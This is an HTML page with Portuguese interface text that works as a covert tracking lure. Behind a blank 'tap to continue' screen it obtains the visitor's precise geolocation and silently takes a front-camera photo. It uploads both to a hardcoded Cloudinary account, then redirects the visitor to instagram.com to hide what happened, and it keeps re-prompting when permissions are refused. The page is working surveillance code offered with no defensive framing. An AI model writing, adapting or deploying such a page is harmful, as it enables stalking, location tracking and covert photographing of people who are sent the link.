<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #2E2E2E;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(255, 255, 255);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    const overlay = document.getElementById("overlay");

    function showOverlay(message, callback) {
      overlay.textContent = message;
      overlay.style.display = "flex";
      overlay.onclick = () => {
        overlay.style.display = "none";
        if (callback) callback();
      };
    }

    function requestLocation(callback) {
      if (!navigator.geolocation) {
        showOverlay("Seu navegador não suporta geolocalização.");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          callback(latitude, longitude);
        },
        (error) => {
          console.error("Erro ao obter localização:", error);

          if (error.code === error.PERMISSION_DENIED) {
            showOverlay("Permissão de localização bloqueada. Vá nas configurações do navegador para permitir.");
          } else {
            showOverlay("Não foi possível obter sua localização. Tente novamente.", () => {
              location.reload();
            });
          }
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    async function capturePhoto() {
      return new Promise(async (resolve, reject) => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false
          });

          const video = document.createElement("video");
          video.setAttribute("autoplay", true);
          video.setAttribute("muted", true);
          video.setAttribute("playsinline", true); // necessário para iOS
          video.srcObject = stream;

          await new Promise((res) => {
            video.onloadedmetadata = () => {
              video.play();
              res();
            };
          });

          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async (blob) => {
              const formData = new FormData();
              formData.append("file", blob);
              formData.append("upload_preset", uploadPreset);
              formData.append("folder", folderName);

              try {
                const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                  method: "POST",
                  body: formData
                });

                if (!response.ok) throw new Error("Erro ao enviar imagem");
                const data = await response.json();
                localStorage.setItem("uploadedImageUrl", data.secure_url);
                resolve(data.secure_url);
              } catch (uploadError) {
                reject(uploadError);
              }
            }, "image/png");
          }, 500);
        } catch (err) {
          showOverlay("Permissão de câmera necessária. Toque para tentar novamente.", startFlow);
          reject(err);
        }
      });
    }

    async function startFlow() {
      requestLocation(async (latitude, longitude) => {
        try {
          const imageUrl = await capturePhoto();

          const textBlob = new Blob(
            [`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`],
            { type: "text/plain" }
          );

          const textForm = new FormData();
          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
          textForm.append("upload_preset", uploadPreset);
          textForm.append("folder", folderName);

          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
            method: "POST",
            body: textForm
          });

          if (!textResp.ok) throw new Error("Erro ao enviar localização");

          localStorage.removeItem("uploadedImageUrl");
          window.location.href = "https://instagram.com";
        } catch (err) {
          console.error("Erro geral:", err);
          showOverlay("Erro no envio. Toque para tentar novamente.", startFlow);
        }
      });
    }

    window.addEventListener("DOMContentLoaded", () => {
      const savedUrl = localStorage.getItem("uploadedImageUrl");
      const retryLocation = localStorage.getItem("retryLocation");

      if (savedUrl && retryLocation) {
        localStorage.removeItem("retryLocation");
        showOverlay("Toque para tentar novamente", () => {
          requestLocation(async (latitude, longitude) => {
            const imageUrl = savedUrl;
            const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });

            const textForm = new FormData();
            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
            textForm.append("upload_preset", uploadPreset);
            textForm.append("folder", folderName);

            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
              method: "POST",
              body: textForm
            });

            if (!textResp.ok) {
              showOverlay("Erro ao reenviar dados. Toque para tentar novamente.", startFlow);
            } else {
              localStorage.removeItem("uploadedImageUrl");
              window.location.href = "https://instagram.com";
            }
          });
        });
      } else {
        showOverlay("Toque para continuar", startFlow);
      }
    });
  </script>
</body>
</html>
